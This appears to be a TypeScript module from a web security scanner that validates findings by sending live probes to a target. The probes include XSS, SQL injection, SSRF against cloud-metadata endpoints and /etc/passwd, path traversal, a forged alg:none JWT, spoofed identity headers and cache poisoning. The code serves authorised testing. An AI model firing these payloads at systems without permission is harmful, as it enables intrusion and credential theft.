import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { probeStep, type ProbeStep } from "@/lib/http-probe.server";

export type Verdict = "confirmed" | "not-exploitable" | "inconclusive" | "skipped" | "error";

export interface ValidationResult {
  findingId: string;
  ranAt: string;
  verdict: Verdict;
  summary: string;
  poc: string;
  active: boolean;
  steps: ProbeStep[];
}

const InputSchema = z.object({
  findingId: z.string().min(1).max(200),
  targetUrl: z.string().url(),
  path: z.string().max(500).optional(),
  authorizeActive: z.boolean().optional().default(false),
}).refine((v) => v.targetUrl.startsWith("https://"), "targetUrl must be https://");

function hostOf(u: string): string {
  try { return new URL(u).host; } catch { return ""; }
}

function assertSameHost(base: string, other: string): void {
  if (hostOf(base) !== hostOf(other)) {
    throw new Error(`PoC target host ${hostOf(other)} does not match scan host ${hostOf(base)}.`);
  }
}

// ---------- individual PoCs ----------

async function pocHsts(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const httpUrl = target.replace(/^https:\/\//, "http://");
  const s1 = await probeStep("Force http:// request", "GET", httpUrl);
  const steps = [s1];
  let verdict: Verdict = "inconclusive";
  let summary = "";
  const loc = s1.responseHeaders["location"] ?? "";
  const hstsOnRedirect = s1.responseHeaders["strict-transport-security"];
  if (s1.status && s1.status >= 300 && s1.status < 400 && loc.startsWith("https://")) {
    if (hstsOnRedirect) {
      verdict = "not-exploitable";
      summary = `Server issued ${s1.status} → ${loc} with HSTS present. Downgrade is blocked on subsequent visits.`;
    } else {
      verdict = "confirmed";
      summary = `Server redirects to HTTPS (${s1.status}) but the http:// response does NOT set HSTS. First-visit downgrade window is exploitable.`;
    }
  } else if (s1.status && s1.status >= 200 && s1.status < 300) {
    verdict = "confirmed";
    summary = `Server answered ${s1.status} over plain http:// — traffic can be intercepted.`;
  } else if (!s1.status) {
    verdict = "not-exploitable";
    summary = `http:// endpoint refused connection (${s1.error ?? "no response"}).`;
  } else {
    verdict = "inconclusive";
    summary = `http:// returned ${s1.status}. Manual review required.`;
  }
  return {
    verdict,
    summary,
    poc: "Downgrade probe: request the same URL over http:// and inspect the response.",
    steps,
  };
}

async function pocHeader(target: string, headerName: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep(`Refetch to inspect ${headerName}`, "GET", target);
  const value = s1.responseHeaders[headerName.toLowerCase()];
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (!value) {
    verdict = "confirmed";
    summary = `${headerName} is absent from the live response — browser protection unavailable.`;
    if (headerName === "X-Frame-Options") {
      const csp = s1.responseHeaders["content-security-policy"] ?? "";
      if (/frame-ancestors/i.test(csp)) {
        verdict = "not-exploitable";
        summary = `${headerName} absent, but CSP frame-ancestors present: ${csp.match(/frame-ancestors[^;]*/i)?.[0]}`;
      } else {
        summary += " No CSP frame-ancestors fallback either — target is clickjackable.";
      }
    }
  } else {
    verdict = "not-exploitable";
    summary = `${headerName} is present: ${value}`;
  }
  return {
    verdict,
    summary,
    poc: `GET the target and read the ${headerName} response header.`,
    steps: [s1],
  };
}

async function pocCookie(target: string, cookieName: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep("Refetch to inspect Set-Cookie", "GET", target);
  const line = s1.setCookies.find((c) => c.split(";")[0].split("=")[0].trim() === cookieName);
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (!line) {
    verdict = "inconclusive";
    summary = `Cookie "${cookieName}" was not re-issued on this request. It may only be set after login or on specific paths.`;
  } else {
    const flags = line.toLowerCase();
    const missing: string[] = [];
    if (!flags.includes("httponly")) missing.push("HttpOnly");
    if (!flags.includes("secure")) missing.push("Secure");
    if (!/samesite=/.test(flags)) missing.push("SameSite");
    if (missing.length === 0) {
      verdict = "not-exploitable";
      summary = `Cookie "${cookieName}" carries HttpOnly, Secure, and SameSite. Not exploitable by client-side theft.`;
    } else {
      verdict = "confirmed";
      summary = `Cookie "${cookieName}" is missing: ${missing.join(", ")}. Raw line captured below.`;
    }
  }
  return {
    verdict,
    summary,
    poc: "Refetch target, isolate the Set-Cookie line for this cookie, and enumerate missing flags.",
    steps: [s1],
  };
}

async function pocXss(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const canary = `nsl${Math.random().toString(36).slice(2, 10)}`;
  const payload = `"><svg/onload=${canary}>`;
  const u = new URL(target);
  u.searchParams.set("q", payload);
  const s1 = await probeStep("Inject canary payload via ?q=", "GET", u.toString());
  const body = s1.bodySnippet;
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (!body.includes(canary) && !body.includes(payload)) {
    verdict = "not-exploitable";
    summary = "Canary was not reflected in the response body.";
  } else {
    const idx = body.indexOf(canary) >= 0 ? body.indexOf(canary) : body.indexOf(payload);
    const window = body.slice(Math.max(0, idx - 60), Math.min(body.length, idx + 80));
    const encoded = /&lt;|&#x3c;|&#60;/i.test(window);
    if (encoded) {
      verdict = "not-exploitable";
      summary = `Reflection observed but HTML-encoded — escape appears intact. Context: …${window}…`;
    } else if (/<svg[^>]*onload/i.test(window)) {
      verdict = "confirmed";
      summary = `Payload reflected raw inside HTML context — executable in a browser. Context: …${window}…`;
    } else {
      verdict = "inconclusive";
      summary = `Reflection observed but escape context ambiguous. Context: …${window}…`;
    }
  }
  return {
    verdict,
    summary,
    poc: `Inject a benign canary ("${payload}") into ?q= and locate reflection context.`,
    steps: [s1],
  };
}

async function pocExposure(target: string, path: string | undefined): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const p = path && path.startsWith("/") ? path : `/${path ?? ""}`;
  const url = new URL(p, target).toString();
  assertSameHost(target, url);
  const s1 = await probeStep(`Fetch exposed path ${p}`, "GET", url);
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (s1.status && s1.status >= 200 && s1.status < 300 && s1.bodyBytes > 0) {
    verdict = "confirmed";
    summary = `${p} returned ${s1.status} with ${s1.bodyBytes} bytes. First bytes below prove exposure.`;
  } else if (s1.status && (s1.status === 401 || s1.status === 403)) {
    verdict = "not-exploitable";
    summary = `${p} returned ${s1.status} — access controls in place.`;
  } else if (s1.status && s1.status === 404) {
    verdict = "not-exploitable";
    summary = `${p} returned 404 — resource no longer present.`;
  } else {
    verdict = "inconclusive";
    summary = `${p} returned ${s1.status ?? s1.error ?? "no response"}.`;
  }
  return {
    verdict,
    summary,
    poc: `Unauthenticated GET against the exposed path.`,
    steps: [s1],
  };
}

async function pocRedirect(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const steps: ProbeStep[] = [];
  const origin = new URL(target).origin;
  let current = target;
  let verdict: Verdict = "not-exploitable";
  let summary = "No off-origin or protocol-downgrading redirect observed within 5 hops.";
  for (let i = 0; i < 5; i++) {
    const s = await probeStep(`Hop ${i + 1}`, "GET", current);
    steps.push(s);
    if (!s.status || s.status < 300 || s.status >= 400) break;
    const loc = s.responseHeaders["location"];
    if (!loc) break;
    const next = new URL(loc, current).toString();
    if (new URL(next).origin !== origin) {
      verdict = "confirmed";
      summary = `Redirect leaves origin: ${current} → ${next}.`;
      break;
    }
    if (next.startsWith("http://")) {
      verdict = "confirmed";
      summary = `Redirect downgrades scheme: ${current} → ${next}.`;
      break;
    }
    current = next;
  }
  return {
    verdict,
    summary,
    poc: "Follow the redirect chain up to 5 hops; flag off-origin or protocol downgrade.",
    steps,
  };
}

async function pocCsrfActive(target: string, endpoint: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const url = endpoint.startsWith("http") ? endpoint : new URL(endpoint, target).toString();
  assertSameHost(target, url);
  const s1 = await probeStep("Cross-origin POST (no cookies, forged Origin)", "POST", url, {
    body: "",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
      "origin": "https://nsl-poc.invalid",
      "referer": "https://nsl-poc.invalid/",
    },
  });
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (s1.status && s1.status >= 200 && s1.status < 300) {
    verdict = "confirmed";
    summary = `Endpoint accepted cross-origin POST with forged Origin header (status ${s1.status}). CSRF surface is real.`;
  } else if (s1.status === 401 || s1.status === 403) {
    verdict = "not-exploitable";
    summary = `Endpoint rejected the cross-origin request with ${s1.status}.`;
  } else if (s1.status && s1.status >= 300 && s1.status < 400) {
    const loc = (s1.responseHeaders["location"] ?? "").toLowerCase();
    verdict = /login|sign[-_ ]?in|auth/.test(loc) ? "not-exploitable" : "inconclusive";
    summary = `Redirected ${s1.status} → ${loc || "(no Location)"}.`;
  } else {
    verdict = "inconclusive";
    summary = `Server returned ${s1.status ?? s1.error ?? "no response"}.`;
  }
  return {
    verdict,
    summary,
    poc: "POST to the endpoint from an off-origin caller with no session cookies and a forged Origin header.",
    steps: [s1],
  };
}

// ---------- new PoC library (standalone probes) ----------

async function pocOpenRedirect(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const evil = "https://nsl-poc.invalid/canary";
  const params = ["next", "url", "redirect", "redirect_uri", "return", "returnUrl", "continue", "dest", "destination"];
  const steps: ProbeStep[] = [];
  let confirmed: string | null = null;
  for (const p of params) {
    const u = new URL(target);
    u.searchParams.set(p, evil);
    const s = await probeStep(`Try ?${p}=<evil>`, "GET", u.toString());
    steps.push(s);
    const loc = s.responseHeaders["location"] ?? "";
    if (s.status && s.status >= 300 && s.status < 400 && loc.includes("nsl-poc.invalid")) {
      confirmed = `${p} → ${loc}`;
      break;
    }
    if (steps.length >= 6) break;
  }
  return {
    verdict: confirmed ? "confirmed" : "not-exploitable",
    summary: confirmed
      ? `Open-redirect confirmed via query param: ${confirmed}`
      : "No tested query parameter caused an off-origin redirect.",
    poc: "Append common redirect params (next, url, redirect, return, dest…) pointing at an external canary and observe the Location header.",
    steps,
  };
}

async function pocMixedContent(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep("Fetch page HTML", "GET", target);
  const body = s1.bodySnippet;
  const matches = Array.from(body.matchAll(/(?:src|href)\s*=\s*["'](http:\/\/[^"']+)["']/gi)).map((m) => m[1]).slice(0, 20);
  return {
    verdict: matches.length > 0 ? "confirmed" : "not-exploitable",
    summary: matches.length > 0
      ? `Found ${matches.length} plain-http subresource(s) referenced from an https page:\n${matches.join("\n")}`
      : "No http:// subresources referenced in the first response body chunk.",
    poc: "Fetch the HTTPS page and search the response body for http:// src/href attributes.",
    steps: [s1],
  };
}

async function pocSri(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep("Fetch page HTML", "GET", target);
  const body = s1.bodySnippet;
  const origin = new URL(target).origin;
  const scripts = Array.from(body.matchAll(/<script\b[^>]*\bsrc\s*=\s*["']([^"']+)["'][^>]*>/gi));
  const missing: string[] = [];
  for (const m of scripts) {
    const tag = m[0];
    const src = m[1];
    let abs: string;
    try { abs = new URL(src, target).toString(); } catch { continue; }
    if (new URL(abs).origin === origin) continue;
    if (!/\bintegrity\s*=/.test(tag)) missing.push(abs);
    if (missing.length >= 15) break;
  }
  return {
    verdict: missing.length > 0 ? "confirmed" : "not-exploitable",
    summary: missing.length > 0
      ? `Cross-origin <script> tags without SRI integrity= attribute:\n${missing.join("\n")}`
      : "All cross-origin scripts either carry integrity= or none were found in the body chunk.",
    poc: "Parse <script src=...> tags in the HTML body, filter cross-origin, flag any missing an integrity= attribute.",
    steps: [s1],
  };
}

async function pocCors(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const evilOrigin = "https://nsl-poc.invalid";
  const s1 = await probeStep("GET with hostile Origin header", "GET", target, { headers: { origin: evilOrigin } });
  const acao = s1.responseHeaders["access-control-allow-origin"];
  const acac = s1.responseHeaders["access-control-allow-credentials"];
  let verdict: Verdict = "not-exploitable";
  let summary = `Access-Control-Allow-Origin: ${acao ?? "(absent)"} · Access-Control-Allow-Credentials: ${acac ?? "(absent)"}`;
  if (acao === evilOrigin || acao === "*" && acac === "true") {
    verdict = "confirmed";
    summary = `CORS misconfiguration: server reflects/allows origin "${acao}" with credentials=${acac ?? "false"}. Cross-origin reads possible.`;
  } else if (acao === evilOrigin) {
    verdict = "confirmed";
    summary = `Server echoed our hostile Origin (${evilOrigin}) into Access-Control-Allow-Origin. Reflection-based CORS bypass.`;
  } else if (acao === "*") {
    verdict = "inconclusive";
    summary = `Wildcard CORS (${acao}); safe unless credentialed. Credentials header: ${acac ?? "absent"}.`;
  }
  return {
    verdict,
    summary,
    poc: "Send a GET carrying Origin: https://nsl-poc.invalid and inspect Access-Control-Allow-Origin / -Credentials.",
    steps: [s1],
  };
}

async function pocCachePoison(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const hostile = "evil.nsl-poc.invalid";
  const s1 = await probeStep("Inject X-Forwarded-Host + X-Forwarded-Proto", "GET", target, {
    headers: { "x-forwarded-host": hostile, "x-forwarded-proto": "http" },
  });
  const loc = s1.responseHeaders["location"] ?? "";
  const body = s1.bodySnippet;
  const reflectedInLoc = loc.includes(hostile);
  const reflectedInBody = body.includes(hostile);
  const cache = s1.responseHeaders["x-cache"] || s1.responseHeaders["cf-cache-status"] || s1.responseHeaders["age"];
  let verdict: Verdict = "not-exploitable";
  let summary = "Injected X-Forwarded-Host was not reflected in the response.";
  if (reflectedInLoc || reflectedInBody) {
    verdict = "confirmed";
    summary = `Server trusts X-Forwarded-Host: value "${hostile}" reflected in ${reflectedInLoc ? "Location" : "body"}. If this response is cached, other visitors receive the poisoned link.${cache ? ` Cache signal: ${cache}` : ""}`;
  }
  return {
    verdict,
    summary,
    poc: "Send GET with X-Forwarded-Host: evil.nsl-poc.invalid and check if the value leaks into Location or body.",
    steps: [s1],
  };
}

async function pocVerbTampering(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const steps: ProbeStep[] = [];
  const findings: string[] = [];
  for (const m of ["PUT", "DELETE", "PATCH", "TRACE"] as const) {
    const s = await probeStep(`${m} same URL`, m, target);
    steps.push(s);
    if (s.status && s.status >= 200 && s.status < 300) {
      findings.push(`${m} → ${s.status} (accepted)`);
    } else if (m === "TRACE" && s.status === 200) {
      findings.push(`TRACE enabled — Cross-Site Tracing surface.`);
    }
  }
  return {
    verdict: findings.length > 0 ? "confirmed" : "not-exploitable",
    summary: findings.length > 0
      ? `Unexpected verb acceptance:\n${findings.join("\n")}`
      : "All non-GET verbs rejected (401/403/404/405).",
    poc: "Issue PUT / DELETE / PATCH / TRACE against the URL and flag any 2xx response.",
    steps,
  };
}

// ---------- auth-bypass PoC class ----------

const PROTECTED_HINT = /(sign\s*in|log\s*in|login|unauthori[sz]ed|forbidden|access denied|please authenticate)/i;

async function pocAnonAccess(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const s1 = await probeStep("Anonymous GET (no cookies, no auth headers)", "GET", target);
  const status = s1.status ?? 0;
  const loc = (s1.responseHeaders["location"] ?? "").toLowerCase();
  const bodyHint = PROTECTED_HINT.test(s1.bodySnippet);
  const looksProtected = /login|sign[-_ ]?in|auth/.test(loc) || (status === 401 || status === 403);
  let verdict: Verdict = "inconclusive";
  let summary = "";
  if (status >= 200 && status < 300 && s1.bodyBytes > 0 && !bodyHint) {
    verdict = "confirmed";
    summary = `URL returned ${status} (${s1.bodyBytes} bytes) to an anonymous caller with no auth signal in the body. If this endpoint is meant to require login, access control is missing.`;
  } else if (looksProtected) {
    verdict = "not-exploitable";
    summary = `Anonymous request rejected: status ${status}${loc ? ` → ${loc}` : ""}. Access control appears enforced.`;
  } else if (status >= 200 && status < 300 && bodyHint) {
    verdict = "not-exploitable";
    summary = `Status ${status} but body contains an auth prompt — server returned a login page instead of protected data.`;
  } else {
    verdict = "inconclusive";
    summary = `Anonymous request returned ${status || s1.error || "no response"}. Manual review required.`;
  }
  return {
    verdict,
    summary,
    poc: "Issue a GET with no cookies / no Authorization header and inspect status, Location, and body for evidence of enforced authentication.",
    steps: [s1],
  };
}

async function pocForwardedUser(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const baseline = await probeStep("Baseline anonymous GET", "GET", target);
  const spoofed = await probeStep(
    "GET with spoofed identity headers",
    "GET",
    target,
    {
      headers: {
        "x-forwarded-user": "admin",
        "x-forwarded-email": "admin@nsl-poc.invalid",
        "x-remote-user": "admin",
        "x-authenticated-user": "admin",
      },
    },
  );
  const bStatus = baseline.status ?? 0;
  const sStatus = spoofed.status ?? 0;
  const bLen = baseline.bodyBytes;
  const sLen = spoofed.bodyBytes;
  let verdict: Verdict = "not-exploitable";
  let summary = `Baseline ${bStatus} (${bLen}B) vs spoofed ${sStatus} (${sLen}B). Server ignored the injected identity headers.`;
  const baselineLocked = bStatus === 401 || bStatus === 403 || /login|sign[-_ ]?in|auth/.test(baseline.responseHeaders["location"] ?? "");
  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && sLen > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
  if (baselineLocked && spoofedAllowed) {
    verdict = "confirmed";
    summary = `Baseline blocked (${bStatus}) but request with X-Forwarded-User: admin returned ${sStatus} with ${sLen} bytes. Upstream trusts client-supplied identity headers — authentication bypass.`;
  } else if (bStatus === sStatus && Math.abs(bLen - sLen) < 32) {
    verdict = "not-exploitable";
    summary = `Identical response for anonymous vs spoofed identity headers (status ${sStatus}). Headers ignored.`;
  } else if (!baselineLocked && spoofedAllowed && sLen > bLen + 256) {
    verdict = "inconclusive";
    summary = `Spoofed response is materially larger than baseline (${sLen}B vs ${bLen}B). Endpoint may reflect the injected identity — manual review.`;
  }
  return {
    verdict,
    summary,
    poc: "Compare a baseline anonymous GET with a GET carrying X-Forwarded-User / X-Remote-User / X-Authenticated-User headers.",
    steps: [baseline, spoofed],
  };
}

async function pocOriginalUrl(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const publicPath = "/";
  const targetedPath = u.pathname + u.search;
  const rewriteUrl = new URL(publicPath, u).toString();
  const baseline = await probeStep(`Baseline anonymous GET ${targetedPath}`, "GET", target);
  const spoofed = await probeStep(
    `GET ${publicPath} with X-Original-URL: ${targetedPath}`,
    "GET",
    rewriteUrl,
    {
      headers: {
        "x-original-url": targetedPath,
        "x-rewrite-url": targetedPath,
      },
    },
  );
  const bStatus = baseline.status ?? 0;
  const sStatus = spoofed.status ?? 0;
  const baselineLocked = bStatus === 401 || bStatus === 403;
  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && spoofed.bodyBytes > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
  let verdict: Verdict = "not-exploitable";
  let summary = `Baseline ${bStatus} (${baseline.bodyBytes}B) vs rewrite ${sStatus} (${spoofed.bodyBytes}B). No rewrite bypass observed.`;
  if (baselineLocked && spoofedAllowed) {
    verdict = "confirmed";
    summary = `Direct access to ${targetedPath} returned ${bStatus}, but GET ${publicPath} with X-Original-URL: ${targetedPath} returned ${sStatus} with ${spoofed.bodyBytes} bytes. IIS/nginx-style URL rewrite bypasses the ACL.`;
  } else if (targetedPath === publicPath) {
    verdict = "inconclusive";
    summary = "Target URL path is already '/'. Point this PoC at a specific protected path (e.g. /admin) for a meaningful test.";
  }
  return {
    verdict,
    summary,
    poc: "Request an unprotected path (e.g. /) with X-Original-URL / X-Rewrite-URL pointing at the protected path; compare to a direct request.",
    steps: [baseline, spoofed],
  };
}

function b64urlEncode(input: string): string {
  return Buffer.from(input, "utf8").toString("base64").replace(/=+$/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

async function pocJwtAlgNone(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const header = b64urlEncode(JSON.stringify({ alg: "none", typ: "JWT" }));
  const now = Math.floor(Date.now() / 1000);
  const payload = b64urlEncode(JSON.stringify({
    sub: "nsl-poc",
    iss: "nsl-poc",
    aud: "nsl-poc",
    iat: now,
    exp: now + 3600,
    role: "admin",
    scope: "admin",
  }));
  const forged = `${header}.${payload}.`;
  const baseline = await probeStep("Baseline anonymous GET (no token)", "GET", target);
  const spoofed = await probeStep(
    "GET with Authorization: Bearer <alg:none JWT>",
    "GET",
    target,
    { headers: { authorization: `Bearer ${forged}` } },
  );
  const bStatus = baseline.status ?? 0;
  const sStatus = spoofed.status ?? 0;
  const baselineLocked = bStatus === 401 || bStatus === 403;
  const spoofedAllowed = sStatus >= 200 && sStatus < 300 && spoofed.bodyBytes > 0 && !PROTECTED_HINT.test(spoofed.bodySnippet);
  let verdict: Verdict = "not-exploitable";
  let summary = `Baseline ${bStatus} vs alg:none token ${sStatus}. Server did not accept the unsigned token.`;
  if (baselineLocked && spoofedAllowed) {
    verdict = "confirmed";
    summary = `Anonymous request rejected (${bStatus}) but an unsigned JWT with alg:"none" was accepted (${sStatus}, ${spoofed.bodyBytes} bytes). JWT verifier trusts the alg header — full authentication bypass.`;
  } else if (sStatus === 401 || sStatus === 403) {
    verdict = "not-exploitable";
    summary = `Server rejected the alg:none token with ${sStatus}.`;
  } else if (sStatus === bStatus) {
    verdict = "inconclusive";
    summary = `Server ignored the Authorization header (both responses ${sStatus}). Endpoint may not consume JWTs.`;
  }
  return {
    verdict,
    summary,
    poc: `Send Authorization: Bearer <header.payload.> where header is {"alg":"none","typ":"JWT"} and payload asserts an admin claim. Compare to an anonymous baseline.`,
    steps: [baseline, spoofed],
  };
}

// ---------- advanced PoC class (SQLi / SSRF / traversal / GraphQL / IDOR / NoSQL) ----------

const SQL_ERROR_HINT = /(sql syntax|mysql_fetch|ORA-\d{4,5}|pg_query|unclosed quotation|sqlite_|syntax error at or near|psycopg2|SQLSTATE|odbc\s+driver|microsoft ole db)/i;

async function pocSqlInjection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const params = Array.from(u.searchParams.keys());
  if (params.length === 0) {
    return { verdict: "inconclusive", summary: "URL has no query parameters to fuzz. Append e.g. ?id=1 and retry.", poc: "Fuzz each query param with SQL meta-characters and boolean payloads.", steps: [] };
  }
  const steps: ProbeStep[] = [];
  const findings: string[] = [];
  for (const p of params.slice(0, 3)) {
    const original = u.searchParams.get(p) ?? "";
    const errUrl = new URL(u); errUrl.searchParams.set(p, `${original}'"`);
    const sErr = await probeStep(`Error probe ?${p}=…'"`, "GET", errUrl.toString());
    steps.push(sErr);
    if (SQL_ERROR_HINT.test(sErr.bodySnippet)) {
      findings.push(`${p}: SQL error leak (${sErr.bodySnippet.match(SQL_ERROR_HINT)?.[0]})`);
      continue;
    }
    const trueUrl = new URL(u); trueUrl.searchParams.set(p, `${original}' AND '1'='1`);
    const falseUrl = new URL(u); falseUrl.searchParams.set(p, `${original}' AND '1'='2`);
    const sTrue = await probeStep(`Boolean TRUE ?${p}=…AND '1'='1`, "GET", trueUrl.toString());
    const sFalse = await probeStep(`Boolean FALSE ?${p}=…AND '1'='2`, "GET", falseUrl.toString());
    steps.push(sTrue, sFalse);
    if (sTrue.status === sFalse.status && Math.abs(sTrue.bodyBytes - sFalse.bodyBytes) > 128) {
      findings.push(`${p}: boolean pair differs (${sTrue.bodyBytes}B vs ${sFalse.bodyBytes}B)`);
    }
  }
  return {
    verdict: findings.length > 0 ? "confirmed" : "not-exploitable",
    summary: findings.length > 0 ? `SQL injection indicators:\n${findings.join("\n")}` : "No SQL error leaks or boolean-pair divergence across probed parameters.",
    poc: "For each query param: (a) inject '\" and grep response for DB error strings; (b) inject boolean TRUE vs FALSE payloads and diff response length.",
    steps,
  };
}

async function pocSsrf(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const ssrfParams = ["url", "uri", "src", "source", "target", "dest", "image", "img", "file", "path", "callback", "webhook", "fetch", "load", "resource"];
  const present = ssrfParams.filter((p) => u.searchParams.has(p));
  if (present.length === 0) {
    return { verdict: "inconclusive", summary: `URL exposes no SSRF-shaped param. Try appending one of: ${ssrfParams.slice(0, 6).join(", ")}.`, poc: "Point known fetch-shaped params at internal metadata endpoints and inspect response.", steps: [] };
  }
  const steps: ProbeStep[] = [];
  const hits: string[] = [];
  const canaries = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:22/",
    "file:///etc/passwd",
  ];
  for (const p of present.slice(0, 2)) {
    for (const c of canaries) {
      const test = new URL(u); test.searchParams.set(p, c);
      const s = await probeStep(`SSRF ?${p}=${c}`, "GET", test.toString());
      steps.push(s);
      const body = s.bodySnippet.toLowerCase();
      if (body.includes("ami-id") || body.includes("instance-id") || body.includes("computemetadata") || body.includes("root:x:0:0") || body.includes("ssh-")) {
        hits.push(`${p} → ${c} leaked internal content (${s.bodyBytes}B)`);
      } else if (s.status && s.status >= 200 && s.status < 300 && s.bodyBytes > 0 && c.startsWith("http://127.")) {
        hits.push(`${p} → ${c} returned ${s.status} (${s.bodyBytes}B) — server reached loopback.`);
      }
    }
  }
  return {
    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
    summary: hits.length > 0 ? `SSRF indicators:\n${hits.join("\n")}` : "No canary response contained cloud-metadata / /etc/passwd markers, and loopback probes did not succeed.",
    poc: "Point SSRF-shaped params (url/src/target/…) at cloud metadata endpoints (169.254.169.254, metadata.google.internal), 127.0.0.1, and file:// URIs; grep response for known markers.",
    steps,
  };
}

async function pocPathTraversal(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const params = Array.from(u.searchParams.keys()).filter((p) => /file|path|page|include|template|doc|name/i.test(p));
  const trials = params.length > 0 ? params : ["file", "path"];
  const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd"];
  const steps: ProbeStep[] = [];
  const hits: string[] = [];
  for (const p of trials.slice(0, 2)) {
    for (const pl of payloads) {
      const t = new URL(u); t.searchParams.set(p, pl);
      const s = await probeStep(`Traversal ?${p}=${pl}`, "GET", t.toString());
      steps.push(s);
      if (/root:x:0:0:/.test(s.bodySnippet) || /\[boot loader\]/i.test(s.bodySnippet)) {
        hits.push(`${p}=${pl} → /etc/passwd content leaked`);
        break;
      }
    }
  }
  return {
    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
    summary: hits.length > 0 ? `Path traversal confirmed:\n${hits.join("\n")}` : "No /etc/passwd or boot.ini markers observed in responses.",
    poc: "Fuzz file/path/page/include-shaped params with encoded ../ sequences and grep response for /etc/passwd markers.",
    steps,
  };
}

async function pocGraphqlIntrospection(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const candidates = ["/graphql", "/api/graphql", "/v1/graphql", "/query"];
  const origin = new URL(target).origin;
  const steps: ProbeStep[] = [];
  const hits: string[] = [];
  const introspection = JSON.stringify({ query: "{__schema{queryType{name} types{name kind}}}" });
  for (const path of candidates) {
    const url = new URL(path, origin).toString();
    const s = await probeStep(`POST introspection ${path}`, "POST", url, {
      body: introspection,
      headers: { "content-type": "application/json" },
    });
    steps.push(s);
    if (s.status === 200 && /"__schema"|"queryType"|"types"/i.test(s.bodySnippet)) {
      hits.push(`${path}: introspection enabled (${s.bodyBytes}B schema returned)`);
      break;
    }
  }
  return {
    verdict: hits.length > 0 ? "confirmed" : "not-exploitable",
    summary: hits.length > 0 ? `GraphQL introspection enabled:\n${hits.join("\n")}` : "No GraphQL endpoint responded with an introspection schema.",
    poc: "POST the standard __schema introspection query to /graphql (and common variants) and check for a schema in the response.",
    steps,
  };
}

async function pocIdorEnumeration(target: string): Promise<Omit<ValidationResult, "findingId" | "ranAt" | "active">> {
  const u = new URL(target);
  const pathParts = u.pathname.split("/");
  const idxInPath = pathParts.findIndex((seg) => /^\d{1,10}$/.test(seg));
  const numericParams = Array.from(u.searchParams.entries()).filter(([, v]) => /^\d{1,10}$/.test(v));
  const steps: ProbeStep[] = [];
  const observations: { key: string; status: number | null; bytes: number }[] = [];
  const probeUrls: { key: string; url: string }[] = [];
  if (idxInPath >= 0) {
    const base = parseInt(pathParts[idxInPath]!, 10);
    for (const delta of [-2, -1, 1, 2]) {
      const clone = [...pathParts]; clone[idxInPath] = String(base + delta);
      const test = new URL(u); test.pathname = clone.join("/");
      probeUrls.push({ key: `path[${idxInPath}]=${base + delta}`, url: test.toString() });
    }
  } else if (numericParams.length > 0) {
    const [p, v] = numericParams[0]!;
    const base = parseInt(v, 10);
    for (const delta of [-2, -1, 1, 2]) {
      const test = new URL(u); test.searchParams.set(p, String(base + delta));
      probeUrls.push({ key: `?${p}=${base + delta}`, url: test.toString() });
    }
  } else {
    return { verdict: "inconclusive", summary: "URL exposes no numeric ID in path or query. IDOR enumeration needs a numeric handle.", poc: "Sweep ±N around a numeric resource ID; flag adjacent 2xx responses with distinct bodies.", steps: [] };
  }
  const baseline = await probeStep("Baseline", "GET", target);
  steps.push(baseline);
  for (const t of probeUrls) {
    const s = await probeStep(`Adjacent ${t.key}`, "GET", t.url);
    steps.push(s);
    observations.push({ key: t.key, status: s.status, bytes: s.bodyBytes });
  }
  const distinct = observations.filter((o) => o.status && o.status >= 200 && o.status < 300 && Math.abs(o.bytes - baseline.bodyBytes) > 32);
  return {
    verdict: distinct.length >= 2 ? "confirmed" : "not-exploitable",
    summary: distinct.length >= 2
      ? `Adjacent IDs return distinct 2xx bodies:\n${distinct.map((d) => `${d.key} → ${d.status} (${d.bytes}B)`).join("\n")}\nBaseline: ${baseline.status} (${baseline.bodyBytes}B). No authorization check on this handle.`
      : "Adjacent IDs did not return distinct authenticated content.",
    poc: "Detect a numeric ID in the path or query, sweep ±N around it, and compare bodies to the baseline.",
    steps,
  };
}

